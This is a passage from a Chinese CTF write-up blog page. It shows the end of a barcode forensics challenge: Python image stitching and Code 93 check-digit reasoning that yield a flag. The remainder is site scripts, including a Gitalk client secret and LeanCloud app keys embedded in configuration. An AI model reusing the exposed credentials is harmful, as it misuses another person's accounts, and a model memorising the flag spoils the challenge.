创建宽度为image_cnt*IMAGE_WIDTH，高度为100的空白新照片</span></span><br><span class="line">new_im = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, (IMAGE_WIDTH * image_cnt, IMAGE_HEIGHT))</span><br><span class="line">im_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, image_cnt):</span><br><span class="line">    im_list.append(Image.<span class="built_in">open</span>(os.path.join(FILE_ROOT, <span class="built_in">str</span>(i) + <span class="string">&#x27;.png&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> im <span class="keyword">in</span> im_list:</span><br><span class="line">    <span class="comment"># 将各个图片对象im粘贴到新图片上，图片的左上角和右下角坐标分别为width,IMAGE_WIDTH,width+IMAGE_WIDTH,IMAGE_HEIGHT</span></span><br><span class="line">    new_im.paste(im, (width, <span class="number">0</span>, width + IMAGE_WIDTH, IMAGE_HEIGHT))</span><br><span class="line">    width = width + IMAGE_WIDTH</span><br><span class="line"><span class="comment"># 宽度不变, 必要时填充高度</span></span><br><span class="line">new_im = new_im.resize((width, TARGET_HEIGHT))</span><br><span class="line"><span class="comment"># 保存成新文件</span></span><br><span class="line">new_im.save(os.path.join(FILE_ROOT, OUTPUT_IMAGE))</span><br><span class="line">new_im.show()</span><br></pre></td></tr></table></figure>
+
+<p>这条形码怪怪的感觉</p>
+<p><img src="/img/2021nitai/new_im.png" class="lazyload" data-srcset="/img/2021nitai/new_im.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="new_im"></p>
+<p>然后发现参考资料：</p>
+<p>[<a target="_blank" rel="noopener" href="http://www.appsbarcode.com/Code%2093.php]">http://www.appsbarcode.com/Code%2093.php]</a>(<a target="_blank" rel="noopener" href="http://www.appsbarcode.com/Code">http://www.appsbarcode.com/Code</a> 93.php)</p>
+<p><img src="/img/2021nitai/image-20211026003505580.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003505580.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003505580"></p>
+<p>START是111141，用PS自动生成参考线，把每9位都写出来。可以看到，前面虽然存在一些不是黑白的颜色，但是发现后面也有START标志，不会被前面影响。</p>
+<p><img src="/img/2021nitai/image-20211026003537600.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003537600.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003537600"></p>
+<p>前面30个字符就可以整理出来了，是：<code>F0C62DB973684DBDA896F9C5F6D962</code></p>
+<p>还差两个字符，提示是停止符号的前两个，也就是上面那个check digit</p>
+<p>这里可以直接生成一个新的条形码，然后得到两个检查位</p>
+<p><img src="/img/2021nitai/image-20211026003613203.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003613203.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003613203"></p>
+<p>对照表格，分别是<code>W</code>和<code>space</code></p>
+<p><img src="/img/2021nitai/image-20211026003637492.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003637492.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003637492"></p>
+<p>组合起来就是，<code>F0C62DB973684DBDA896F9C5F6D962W[space]</code></p>
+<p>整理卡了半天。。。后面跑去问是不是题目错了。。</p>
+<p>得到的答复是</p>
+<blockquote>
+<p>小写生成的条码是没有w和空格的</p>
+</blockquote>
+<p>条形码解出来的不是全大写的嘛，标准就是呀</p>
+<p>也就是说不是用 <code>F0C62DB973684DBDA896F9C5F6D962</code> 去生成条形码，而是用小写 <code>f0c62db973684dbda896f9c5f6d962</code> 去生成</p>
+<p><a target="_blank" rel="noopener" href="http://barcode.cnaidc.com/html/BCGcode93.php">http://barcode.cnaidc.com/html/BCGcode93.php</a></p>
+<p><img src="/img/2021nitai/image-20211026004150616.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026004150616.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026004150616"></p>
+<p>算了一下发现两个检查位分别是 221121(U) 和  111222(M)</p>
+<p>最终flag <code>flag&#123;f0c62db973684dbda896f9c5f6d962um&#125;</code></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://tari.moe/p/2021/2021nitai/>https://tari.moe/p/2021/2021nitai/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf比赛</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/p/2021/2021summury/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>告别2021</p>
+          <p class='content'>
+
+本来想着春节在写的，看到大家都写了，跟风一下，2333
+3-5月 毕设&amp;论文年后先回公司两周，实习期满3月后回校开始做毕设和写论文，因实习期间做Python代码审计较多，想着能否编写...</p>
+        </a>
+      
+      
+        <a class='next' href='/p/2021/2021ycb/'>
+          <p class='title'>2021羊城杯部分 Writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+
+
+和几个**”社会”**人士（@DEADF1SH-CAT、 @Oah、 @小火车）一起组队参加了这次比赛，终于不用在高校组卷了，哈哈
+部分题目下载链接：
+
+2021ycb-misc.7z
+...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="gitalk-container"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-zerocalc"><span class="toc-text">0x1 zerocalc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-ezPickle"><span class="toc-text">0x2 ezPickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-EasyFilter"><span class="toc-text">0x3 EasyFilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4-Jack-Shiro"><span class="toc-text">0x4 Jack-Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5-new-hospital"><span class="toc-text">0x5 new_hospital</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6-Give-me-your-0day"><span class="toc-text">0x6 Give_me_your_0day</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-sonic"><span class="toc-text">0x1 sonic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E6%8B%9F%E6%80%81%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">0x1 拟态签到题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-WeirdPhoto"><span class="toc-text">0x1 WeirdPhoto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-bar"><span class="toc-text">0x2 bar</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="2021第四届“强网”拟态防御国际精英挑战赛 Writeup";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        
+          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
+</div>
+        
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2022 TARI TARI</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+  function pjax_gitalk() {
+    if(!document.querySelectorAll("#gitalk-container")[0])return;
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    if (document.getElementById('gitalk-container') != null) {
+      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tarimoe.github.io","owner":"tarimoe","admin":["tarimoe"],"path":null}, {
+	  id: path,
+	  distractionFreeMode: false  // Facebook-like distraction free mode
+    }));
+      gitalk.render('gitalk-container');
+    }
+  }
+  $(function () {
+    pjax_gitalk();
+  });
+  volantis.pjax.push(pjax_gitalk);
+</script>
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('/js/search/hexo.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
+    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://tari.moe' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
